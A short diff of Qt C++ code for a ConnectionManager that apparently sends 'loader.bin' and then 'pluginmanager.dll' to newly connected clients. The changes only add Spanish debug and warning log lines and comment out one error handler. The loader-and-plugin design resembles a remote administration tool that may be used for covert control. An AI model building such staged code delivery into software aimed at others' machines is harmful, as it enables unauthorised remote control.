@@ -14,9 +14,11 @@ void ConnectionManager::sendLoader(Connection *connection)
 {
     if(connection->getState()==Connection::JustConnected)
     {
+        qDebug("Enviando loader");
+
         connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
         connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
-        connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));
+        //connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));
 
         /* Carga desde archivo */
         QFile fileLoader("loader.bin");
@@ -44,6 +46,8 @@ void ConnectionManager::sendLoader(Connection *connection)
 
 void ConnectionManager::sendPluginManager(Connection *connection)
 {
+    qDebug("Enviando pluginmanager");
+
     QFile filePluginLoader("pluginmanager.dll");
     if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
     QByteArray pluginLoader=filePluginLoader.readAll();
@@ -119,6 +123,8 @@ void ConnectionManager::connection_timeout()
 {
     /* TODO: eliminar de la gui tambien */
 
+    qWarning("Conection timeout");
+
     Connection* connection=qobject_cast<Connection*>(sender());
     connection->deleteLater();
 }
@@ -127,6 +133,8 @@ void ConnectionManager::connectionError(QAbstractSocket::SocketError)
 {
     /* TODO: Hacer que si hay un error en la conexión cuando la conexión ya
              está añadida a la GUI, se elimine el item del TreeView */
+
+    qWarning("Conection error");
 
     Connection* connection=qobject_cast<Connection*>(sender());
     connection->deleteLater();
